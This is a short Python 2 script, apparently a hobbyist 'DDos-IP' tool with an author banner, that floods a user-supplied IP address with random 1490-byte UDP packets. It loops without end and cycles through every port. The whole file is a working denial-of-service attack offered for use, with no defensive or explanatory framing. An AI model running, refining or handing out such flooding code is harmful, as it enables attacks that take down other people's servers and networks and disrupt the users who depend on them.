import sys
import os
import time
import socket
import random
##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos-IP")
print
print "Author   : Phacker {Different Cyber}"
print "You Tube : Grim.Hacker.555"
print "github   : https://github.com/Grim Hacker 555"
print "Facebook : https://www.facebook.com/phacker"
print
ip = raw_input("IP Target : ")
port = input("Port       : ")
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "IP: %s Sent: %s port:%s"%(ip,sent,port)
     if port == 65534:
       port = 1
